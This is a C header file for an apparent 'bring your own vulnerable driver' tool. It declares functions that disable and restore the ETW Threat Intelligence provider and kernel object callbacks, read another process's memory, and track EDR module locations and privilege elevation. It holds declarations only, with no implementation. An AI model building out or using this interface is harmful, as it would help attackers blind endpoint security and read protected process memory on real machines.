#ifndef BYOVD_H
#define BYOVD_H

#include <windows.h>
#include "ntdefs.h"

typedef struct {
    ULONG64 ntos_base;
    DWORD   handle_rva;
    DWORD   elevate_rc;
    ULONG64 old_value;
    ULONG64 readback;
    ULONG64 edr_base;
    DWORD   edr_size;
    DWORD   ob_rc;
    ULONG64 ob_data;
    ULONG64 ob_saved;
} BYOVD_DEBUG;

BOOL byovd_open(void);
void byovd_close(void);
int byovd_disable_etwti(void);
BOOL byovd_restore_etwti(void);
BYOVD_DEBUG *byovd_get_debug(void);
int byovd_disable_ob_callbacks(void);
BOOL byovd_restore_ob_callbacks(void);
int byovd_get_drv_type(void);
BOOL byovd_read_vm(DWORD pid, PVOID remote_addr, PVOID local_buf, SIZE_T size, SIZE_T *bytes_read);

#endif /* BYOVD_H */
